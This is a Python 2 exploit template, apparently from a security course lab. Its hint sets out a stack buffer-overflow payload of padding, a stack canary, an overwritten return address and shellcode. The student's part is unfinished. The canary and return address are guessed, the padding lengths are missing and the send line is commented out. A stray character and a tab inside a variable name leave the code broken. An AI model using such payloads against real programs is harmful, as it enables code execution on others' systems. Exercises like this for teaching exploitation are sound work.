#!/usr/bin/env python2

from scaffold import *
# HINT: the last line of your exploit should look something like:
#   p.send('A' * m + canary + 'B' * n + rip + SHELLCODE + '\n')
# where m, canary, n and rip are all values you must determine
# and you might need to add a '\x00' somewhere
### YOUR CODE STARTS HERE ###

#m = find
canary = "\x44\xbfb\xff\xbf"
#n = find

rip = "\x50\xfb\xff\xbf"

#p.send('A' * m + "\x00" + canary + 'B' * n + rip + SHELLCODE + '\n')


### YOUR CODE ENDS HERE ###
returncode = p.end()
if returncode == -11: print 'segmentation fault or stack canary!'
elif returncode != 0: print 'return code', retur	ncode
